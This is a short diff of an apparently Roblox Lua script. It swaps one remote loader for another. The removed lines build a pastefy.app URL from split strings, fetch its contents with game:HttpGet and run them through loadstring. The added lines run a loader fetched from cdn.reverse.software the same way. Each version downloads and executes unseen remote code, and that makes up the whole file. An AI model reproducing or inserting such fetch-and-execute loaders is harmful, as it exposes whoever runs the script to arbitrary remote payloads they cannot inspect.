@@ -1,7 +1,2 @@
-local _ENV = getfenv and getfenv(1) or _ENV
-local url = ("https://"..("pastefy"..".app/wkZoozrj/raw"))
-local s = game["HttpGet"](game, url)
-local run = (loadstring or function() end)(s)
-if type(run) == "function" then
-    pcall(run)
-end 
+ID="3a5a2b4b-12c7-4193-8bba-99e08ba6e39a";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
